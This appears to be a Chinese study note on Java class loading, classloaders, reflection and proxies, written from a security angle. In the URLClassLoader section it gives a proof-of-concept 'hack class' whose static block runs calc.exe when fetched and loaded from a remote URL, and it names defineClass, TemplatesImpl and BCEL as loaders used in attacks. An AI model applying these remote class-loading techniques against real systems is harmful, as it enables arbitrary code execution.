---
date: 2025-03-21
---

类加载是将.class 字节码加载到 jvm中。被其他程序使用。
这个过程有：**加载**，**链接**，**初始化**。

<img src="https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260404165431713.png" style="zoom:50%;" />

# 过程

## 加载

* 通过全限定名获取 .class字节码(来自文件/网络)
* 将字节码字节码转化为jvm内部运行时的数据结构
* 在内存中创建java.lang.Class对象

## 验证

.class作为文件，很容易被修改，验证阶段检测字节码，只有合法的才能被加载
主要检测：

* 二进制流是否符合格式，比如是否以cafe babe开头
* 方法是否遵循访问控制关键字的限定（protected，private）
* 方法调用的参数和个数是否正确
* 变量是否正确初始化
* 变量是否赋予了正确的值

## 准备

为静态变量分配内存，并初始化(默认值,0,null,false等)

## 解析

将常量池中的符号引用转化为直接引用。
符号引用用一组符号来表示目标，java编译时并不知道引用类的实际地址，只能用符号来代替。
直接引用对符号进行解析，找到引用的实际地址。

## 初始化

对类变量/代码块中的变量进行赋值。（注：不是实例的初始化，是类变量的初始化）
初始化时机：

> 创建类的实例时。
> 访问类的静态方法或静态字段时（除了 final 常量，它们在编译期就已经放入常量池）。
> 使用 java.lang.reflect 包的方法对类进行反射调用时。
> 初始化一个类的子类（首先会初始化父类）。
> JVM 启动时，用户指定的主类（包含 main 方法的类）将被初始化

# 类加载器

类加载器负责将.class加载进jvm，负责第一步。
对于两个类在jvm中是否相同，有两点判断：

* 负责加载类的loader实例是否是同一个
* 限定名是否相同

类的加载有两种模式:**显示**和**隐式**,

* 显式/类动态

  Class.forName(String className)   第二个参数控制是否初始化
  ClassLoader.loadClass(String name)   只对类进行加载,不进行初始化

* 隐式加载

  静态方法/字段访问   
  子类初始化         子类初始化,父类也会初始化
  创建对象   

## Bootstrap ClassLoader

引导类加载器，负责JVM核心库类，如rt.jar，sun.boot.class.path
比较特殊,是C++写到JVM中的,JVM启动时,没有java环境,需要一个底层的进行加载,就是这个.

## Extention ClassLoader

加载扩展库中的类，如jre/lib/ext，或者由java.ext.dirs指定位置的类

## app ClassLoader

系统/应用加载器,负责加载java.class.path 上指定的库,一般是应用类/第三方库.
默认加载器

## ClassLoader

java有一套机制，可以让用户自定义类加载器，继承ClassLoader。

## 双亲委派

加载类时，根据全限定名判断是否加载。
如果加载，就返回已加载。
如果没有，就尝试让父类加载器加载，父类也是这样。直到Bootstrap

如果父加载器无法加载，就交给子类来加载，顺序是bootstrap->Extention->appClassLoader->自定义loader

# 动态加载字节码    

## java字节码

字节码是java编译后，生成在class文件中的内容，是jvm中运行的指令集。
也可以指：能被恢复为一个类并在内存中执行的字节序列

## URLClassLoader

从远程加载class文件。
java的默认类加载器(系统ClassLoader)的父类是URLClassLoader，可以从URL指定的路径加载class

正常情况下，Java会根据配置项` sun.boot.class.path `和` java.class.path` 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：

①：URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件

②：URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件

③：URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类

### 条件：

* 依赖协议
  HTTP/HTTPS，file，ftp，jar，jndi，rmi，ldap
* 目标出网
* 加载的是标准的，完整的.class

>  可以触发恶意代码的地方：

* 静态代码块
  第一次加载/初始化类
* 构造方法



### 例子

```java
public class test {
    public static void main(String args[]){
        try{
            URL[] urls =new URL[]{new URL("http://localhost:8080/")};
            URLClassLoader urlClassLoader =new URLClassLoader(urls);
            Class<?> cls =urlClassLoader.loadClass("hutao.com.hello");
            cls.newInstance();
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
}


```

hackClass：

```java
public class hello {
    public static void main(String args[]){
        System.out.println("this is a hack class");
    }

    static {
        System.out.println("Static block: Hello World!");
        try {
            Class clazz =  Class.forName("java.lang.Runtime");
            Method method = clazz.getMethod("getRuntime");
            Runtime runtime = (Runtime) method.invoke(clazz);
            runtime.exec("calc.exe");
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

输出：
![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260404163458201.png)

## defineClass()

直接加载字节码
类加载核心是ClassLoader的 defineClass()

![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260404203657298.png)

![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260410165643797.png)

返回一个class
b：字节码，off：从哪个字节开始，len：字节长度

会把字节码直接加载到JVM中.但不会初始化
![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260410165744311.png)

接收加载的类，并实例化
![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260410165858903.png)

实例化会初始化类，会触发代码块
![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260410170200137.png)



> 利用条件:

defineClass()只会加载类和链接类,不会初始化.不会执行代码块/构造函数.想要执行代码需要显示调用newInstance()或调用它的静态方法.
进行初始化才能执行.
实战中,显示调用并不常见,更常见的是本身就调用了defineClass(),

## templatesImpl

ClassLoader的defineClass()，是protected，实战中更常用的，是templateslmpl类。
主要是它有一个内部类，TransletClassLoader，是ClassLoader的子类，重写了defineClass()，
没有显式声明定义域，那么他就是default，可以在外面被调用。

![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260405171006373.png)

## BCEL Classloader

BBEL ：apache commons BCEL，属于apache commons项目的一个子项目。
但是被Apache Xalan使用，且Apache Xalan是对java内部JAXP实现，所以BCEL 是在原生的jdk内部。

Repsitory：
可以把一个类转换为字节码：

```java
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;

public class BCELclassloaderTest {
    public static void main(String []args) throws Exception {
        JavaClass cls = Repository.lookupClass(evil.Hello.class);
        String code = Utility.encode(cls.getBytes(), true);
        System.out.println(code);
    }
}
```

BCEL ClassLoader：
可以加载Repsitory生成的字节码

```java
public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException {
        new ClassLoader().loadClass("字节码").newInstance();
    }
```

## unsafe

# 反射

在运行时，对于任意一个类，都能获取到这个类的所有属性和方法，对于任意一个对象，都能访问它的方法和属性(包括private)。这种动态调用机制就是反射。

JVM为每个加载的`class`创建了对应的`Class`实例，并在实例中保存了该`class`的所有信息；因此，如果获取了某个`Class`实例，我们就可以通过这个`Class`实例获取到该实例对应的`class`的所有信息。

要调用任意对象都任意方法，需要步骤：

* 获得该对象对应Class类的实例
* 通过实例获取要调用的方法
* 传入参数，进行调用

> Class类：

表示类的对象，主要方法：

* getFileds()：获取公共字段
* getDeclaredFileds()：所有字段，包括私有
* getMethods()：获取公共方法
* getDeclaredMethod()：获取所有方法，包括私有
* getConstructors()：公共构造方法，
* getInterfaces()：获取所有接口
* getSuperclass()：获取父类

> Field类：

表示属性

* get(obj)
* set(obj,value)
* getType()
* getModifiers()

> Method类：

* invoke(obj,args)
* getReturnType()
* getModifiers()

```java
URL ulr=new URL(); 
Class<URL> url1 =URL.Class; //表示URL对象

Filed hashcode1=url.getDeclaredFields("hashCode"); //表示URL对象的hashCode属性
hashcode1.setAccessible(true);  		//如果属性是private，要先设置可访问。另：java17后无法访问private属性,即使设置了可访问，会抛出错误
hashcode1.set(url,1);    //根据对象名称:url，修改该对象(url)的属性(hashCode)为1

Method meth1=url1.getDeclaredMethod("setPort");  //获取setPort方法。注：URL没有setPort方法，只是为了方便假设有
meth1.invoke(url,23);				//调用url对象的setPort端口，参数为23
```

# 代理

## 静态代理

一个类(目标类)的方法在其他类能调用/增强。需要有一个接口来指定目标类的哪些方法需要代理。
本质就就是代理类的属性是一个目标类，在代理类的方法中调用属性中目标类的方法。

demo:

```java
//目标类：
public class BigStar implements  star{
    private String name;
    public BigStar(String name) {
        this.name = name;
    }
    public void Dance(){
        System.out.println(this.name + "正在跳舞");
    }
}
//接口
public interface star {
    String Dance();}
//代理类

public class littleStar implements star{
    private String name;
    private BigStar bigStar;//目标类
    public littleStar(BigStar bigStar){
        this.bigStar=bigStar;
    }

    @Override
    public void Dance() {
        System.out.println(this.name + "正在跳舞");
        bigStar.Dance();
    }
}

//客户端调用代理类
public class Demo {
    public static void main(String[] args) {
        BigStar bigStar =new BigStar("bigstar");  //
        littleStar littleStar =new littleStar(bigStar);
        littleStar.Dance();
    }
}
```



## 动态代理

动态代理不需要接口和代理类，只需要目标，使用Proxy和InvocationHandler实现动态代理：

```java
//目标类
public class BigStar implements  star{
    private String name;

    public BigStar(String name) {
        this.name = name;
    }
    public void Dance(){
        System.out.println(this.name + "正在跳舞");
    }
}

//动态代理类demo
 public static void main(String[] args) {
        BigStar bigStar =new BigStar("bigstar");  //先实例化目标类

        star littleStar = (star) Proxy.newProxyInstance(     //实例化一个代理(接口)
                ProxyUtils.class.getClassLoader(),      //目标类加载器，默认或者默认
                new Class[]{star.class},				//接口数组类
                new InvocationHandler() {				//创建一个匿名类，实现了代理接口，方法名称传入重写的invoke调用执行。
                    @Override
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        if (method.getName().equals("Dance")){  //invoke中进行增强
                            bigStar.Dance();
                        }
                        return null;
                    }
                }
        );
        littleStar.Dance();
    }
```

